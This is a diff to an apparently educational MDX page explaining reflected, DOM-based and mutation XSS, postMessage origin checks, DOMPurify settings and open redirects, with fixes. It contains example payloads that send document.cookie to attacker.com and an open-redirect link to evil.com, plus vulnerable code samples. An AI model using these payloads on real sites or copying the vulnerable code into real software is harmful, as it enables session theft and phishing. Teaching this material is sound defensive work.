@@ -12,6 +12,8 @@ import Comparison from '../../../components/mdx/Comparison.astro';
 import Callout from '../../../components/mdx/Callout.astro';
 import Lessons from '../../../components/mdx/Lessons.astro';
 import Lesson from '../../../components/mdx/Lesson.astro';
+import URLAnatomy from '../../../components/mdx/URLAnatomy.astro';
+import NetworkPath from '../../../components/mdx/NetworkPath.astro';
 
 A DevForum user posts what looks like a syntax-highlighted code block. It contains a hidden `<script>` tag. The moment any other logged-in user loads the article, the script fires silently. It reads `document.cookie`, packages the session token, and fires it to a server the attacker controls. No alert box. No visible sign anything went wrong. Within an hour, forty sessions are hijacked from a single comment.
 
@@ -49,9 +51,17 @@ app.get('/search', (req, res) => {
 
 The parameter goes directly into the HTML with no escaping. An attacker constructs a URL:
 
-```
-https://devforum.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
-```
+<URLAnatomy
+  title="Reflected XSS Attack URL — Where the Payload Lives"
+  caption="The payload is in the query string. The server reads it and writes it directly into the HTML response — no escaping, no encoding."
+  parts={[
+    { value: "https://",           label: "Scheme",     description: "HTTPS — the victim's browser trusts this as a legitimate secure connection" },
+    { value: "devforum.com",       label: "Host",       description: "The real DevForum domain — this is not a phishing URL" },
+    { value: "/search",            label: "Path",       description: "A real DevForum route — the search endpoint" },
+    { value: "?q=",                label: "Query key",  description: "The search parameter the server reads and renders into the page" },
+    { value: "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>", label: "Payload", description: "The XSS script — injected as the query value. The server writes this verbatim into the HTML response." },
+  ]}
+/>
 
 They send this link to a DevForum user via a DM. The victim clicks it. Here's what happens:
 
@@ -72,7 +82,7 @@ They send this link to a DevForum user via a DM. The victim clicks it. Here's wh
   caption="The payload travels in the URL and lands verbatim in the server's HTML response. The victim's browser executes it with full origin access."
 />
 
-The fix is one line: HTML-encode the parameter before rendering it. `req.query.q` becomes `he.encode(req.query.q)`, or you switch to a templating engine that escapes by default. The script tag becomes the literal text `&lt;script&gt;` — visible, harmless.
+The fix is one line: HTML-encode the parameter before rendering it. `req.query.q` becomes `he.encode(req.query.q)` (using the `he` HTML encoding library), or you switch to a templating engine that escapes by default. The script tag becomes the literal text `&lt;script&gt;` — visible, harmless.
 
 **Why it's called "reflected":** the payload is sent to the server and reflected straight back in the response. The server is a mirror, not a target.
 
@@ -125,7 +135,7 @@ The two variants above both involve the server rendering the payload. DOM-based 
 DevForum has a "highlight by username" feature: open an article with `?highlight=honeysharma` in the URL and any mention of that username is visually highlighted. The implementation:
 
 ```js
-// client.js — runs in the browser
+// client.js — do not ship this
 const params = new URLSearchParams(location.search);
 const user = params.get('highlight');
 
@@ -135,6 +145,23 @@ if (user) {
 }
 ```
 
+<NetworkPath
+  title="DOM XSS Data Flow — Source to Sink"
+  caption="The payload travels through three JavaScript steps before reaching the sink. No server involved. No HTTP response modified. A WAF watching the network sees nothing."
+  direction="horizontal"
+  nodes={[
+    { id: "source", type: "device",   label: "URL Source",      sublabel: "location.search",                annotation: "attacker-controlled", highlight: true },
+    { id: "parse",  type: "router",   label: "JS Parser",       sublabel: "URLSearchParams.get('highlight')" },
+    { id: "var",    type: "dns",      label: "JS Variable",      sublabel: "const user = …" },
+    { id: "sink",   type: "firewall", label: "DOM Sink",         sublabel: "innerHTML = `…${user}…`",        annotation: "payload executes here", highlight: true },
+  ]}
+  edges={[
+    { from: "source", to: "parse", label: "?highlight=<payload>" },
+    { from: "parse",  to: "var",   label: "unsanitised string" },
+    { from: "var",    to: "sink",  label: "written to DOM" },
+  ]}
+/>
+
 The `highlight` parameter goes straight into `innerHTML`. An attacker crafts a link:
 
 ```
@@ -142,6 +169,24 @@ https://devforum.com/articles/123?highlight=<img src=x onerror="fetch('https://a
 ```
 
 The server sees a completely normal request for article 123. Its response contains no payload. The payload is in the URL. The browser reads it, the client-side JS writes it to the DOM, and it executes.
+
+<SequenceDiagram
+  title="DOM-Based XSS — The Server Never Sees the Payload"
+  actors={[
+    { id: "attacker", label: "Attacker", variant: "malicious" },
+    { id: "victim",   label: "Victim's Browser", icon: "browser" },
+    { id: "forum",    label: "devforum.com", icon: "server", variant: "trusted" },
+    { id: "c2",       label: "attacker.com", icon: "server", variant: "malicious" }
+  ]}
+  messages={[
+    { from: "attacker", to: "victim",  label: "Sends link via DM", sublabel: "/articles/123?highlight=<img src=x onerror=fetch(...)>", type: "attack" },
+    { from: "victim",   to: "forum",   label: "GET /articles/123?highlight=<img ...>", type: "request" },
+    { from: "forum",    to: "victim",  label: "200 OK — normal article HTML (no payload)", type: "response", annotation: "server sees nothing unusual" },
+    { from: "victim",   to: "victim",  label: "client.js reads location.search → writes to innerHTML", type: "note", highlight: true },
+    { from: "victim",   to: "c2",      label: "Exfiltrate session token", type: "attack", annotation: "onerror handler fires" }
+  ]}
+  caption="The server's response is clean. A WAF inspecting HTTP traffic sees nothing. The payload exists only in the URL — client-side JavaScript delivers it into the DOM."
+/>
 
 **Why this matters for detection:** WAFs, server-side sanitisers, and security scanners that inspect HTTP responses will find nothing. The vulnerability exists entirely in the client.
 
@@ -155,7 +200,9 @@ The server sees a completely normal request for article 123. Its response contai
 
 Mutation XSS exploits a gap between what a sanitiser considers safe and what the browser's HTML parser actually produces.
 
-The browser's parser is not a validator — it's a recovery machine. It will fix malformed markup, restructure elements to match the content model, and produce valid HTML from invalid input. This restructuring can turn a "safe" sanitised string into one that contains executable script.
+The browser's HTML parser does not just read markup — it actively repairs it. When it encounters invalid or malformed HTML (unclosed tags, elements nested where they aren't allowed, mismatched namespaces), it restructures the tree into something valid rather than refusing to render the page. This is why broken HTML still displays in browsers: the parser fixed it silently.
+
+The problem for sanitisers: a sanitiser checks a string *before* the parser runs. The parser then transforms that string into a different DOM tree. A string that looked safe to the sanitiser can become unsafe after the parser restructures it.
 
 A classic example:
 
@@ -181,9 +228,11 @@ The sanitiser saw a `<style>` block with what looked like text. The browser's pa
 
 ---
 
-## Sources and Sinks
+## Where Attacker Input Enters — and Where It Explodes
 
-Every XSS attack connects a **source** (where attacker input enters the application) to a **sink** (where that input is interpreted as code or markup).
+Every XSS attack has two ends. At one end, attacker-controlled text gets into your application — through a URL parameter, a database value, a `postMessage` event, something the user typed. At the other end, that text lands somewhere the browser interprets it as code: `innerHTML`, `eval()`, an element's `href`. Nothing bad happens unless these two ends connect without sanitisation in between.
+
+Security literature calls these ends **sources** (where attacker input enters) and **sinks** (where input is interpreted as code or markup). The terms are worth knowing because they're used in every security audit tool, scanner, and code review checklist — but the underlying idea is just: trace the data from where it comes in to where it lands.
 
 <Comparison
   headers={["Category", "Examples", "Risk", "Notes"]}
@@ -200,6 +249,42 @@ Every XSS attack connects a **source** (where attacker input enters the applicat
 />
 
 In code review, the exercise is: trace every source. Follow it through the callstack. Does it reach a sink? If yes, is it sanitised before it gets there?
+
+---
+
+## `postMessage`: The Cross-Frame Source
+
+`window.postMessage` is the browser's mechanism for two pages to communicate across origins — a parent page talking to an embedded payment widget, a micro-frontend talking to a shell app, an analytics iframe sending data back to the host page.
+
+The source entry in the table above is `window.addEventListener('message', e => e.data)`. Here is what a vulnerable implementation looks like:
+
+```js
+// Vulnerable — do not ship this
+window.addEventListener('message', (event) => {
+  // 'data' is whatever the sender put in postMessage(data, ...)
+  // No check on where it came from
+  document.getElementById('status').innerHTML = event.data;
+});
+```
+
+Any page — from any origin — can send a `postMessage` to this window. If the event data reaches a DOM sink without sanitisation, it is stored XSS delivered through the cross-frame channel instead of a database. Payment iframes, A/B testing tools, analytics scripts, and OAuth popups all use `postMessage`. If any of them are compromised, a missing origin check turns that compromise into XSS on your page.
+
+The fix is two lines:
+
+```js
+const ALLOWED_ORIGIN = 'https://payments.devforum.com';
+
+window.addEventListener('message', (event) => {
+  if (event.origin !== ALLOWED_ORIGIN) return;  // reject unknown senders
+  document.getElementById('status').textContent = event.data;  // textContent, not innerHTML
+});
+```
+
+Two changes matter: the `event.origin` check rejects any sender that isn't the expected iframe, and `textContent` instead of `innerHTML` removes the sink entirely — the data is displayed as literal text, not parsed as markup.
+
+<Callout type="warning" title="event.source is not a substitute for event.origin">
+  Some code checks `event.source === someIframeElement.contentWindow` instead of checking `event.origin`. This is not safe — an attacker can spoof `event.source` in certain browser contexts. Always validate `event.origin` against an explicit string. Never use `.startsWith()` or `.includes()` on origins; use strict equality so `https://payments.devforum.com.evil.com` does not pass.
+</Callout>
 
 ---
 
@@ -309,12 +394,16 @@ Two configuration mistakes that open XSS vectors:
 
 ```js
 // Dangerous — ALLOW_DATA_ATTR re-enables data-* attributes
-// Some parsers and frameworks execute handlers attached to data-* attributes
+// Standard HTML does not execute data-* attributes, but frameworks that
+// use data-* for behaviour bindings (e.g. older AngularJS data-ng-* directives,
+// Alpine.js x-* equivalents) can turn them into XSS vectors in those contexts.
 DOMPurify.sanitize(dirty, { ALLOW_DATA_ATTR: true });
 
 // Dangerous — FORCE_BODY: false changes the parsing context
-// Body context parses differently from fragment context;
-// some mXSS payloads survive only outside a body element
+// DOMPurify defaults to FORCE_BODY: true (body-context parsing).
+// Setting it to false switches to fragment-context parsing, which the browser
+// handles differently — some mXSS payloads survive only in a non-body context.
+// Only override this if you fully understand the parsing difference.
 DOMPurify.sanitize(dirty, { FORCE_BODY: false });
 ```
 
@@ -336,6 +425,41 @@ DOMPurify.sanitize(dirty, { FORCE_BODY: false });
   ]}
   caption="All four variants result in attacker-controlled JavaScript executing under your origin's trust. The entry path and persistence differ — the damage does not."
 />
+
+---
+
+## Open Redirect: The Attack that Chains With Everything
+
+Open redirect is not XSS, but it lives in the same place — URL parameters — and is frequently chained with it. A DevForum login page that accepts a `next` parameter to redirect the user after sign-in:
+
+```js
+// Express — do not ship this
+app.get('/login', (req, res) => {
+  // After auth, redirect to the page the user was trying to reach
+  const next = req.query.next || '/dashboard';
+  res.redirect(next);  // no validation
+});
+```
+
+An attacker sends `https://devforum.com/login?next=https://evil.com/steal`. The user sees a legitimate DevForum URL, logs in, and is redirected to `evil.com` — a phishing page styled to look like DevForum's dashboard. The redirect happens silently. The user never typed `evil.com`.
+
+The fix is to validate the redirect destination against an allowlist of internal paths:
+
+```js
+// Only permit relative paths starting with /
+function isSafeRedirect(url) {
+  return typeof url === 'string' && url.startsWith('/') && !url.startsWith('//');
+}
+
+const next = req.query.next;
+res.redirect(isSafeRedirect(next) ? next : '/dashboard');
+```
+
+`//evil.com` is a protocol-relative URL — it redirects to `evil.com` on whichever scheme the browser picks. The `!url.startsWith('//')` check catches it. Anything that starts with `/` and not `//` is a relative path on the same host.
+
+<Callout type="warning" title="Open redirect is dangerous precisely because the originating URL is real">
+  The victim sees `devforum.com` in the address bar. The URL passes link scanners, phishing filters, and human inspection. After the redirect, they are on the attacker's domain — but the trust was established by the legitimate host. Chain this with a credential-harvesting page and the attack requires no technical sophistication beyond sending a link.
+</Callout>
 
 ---
 
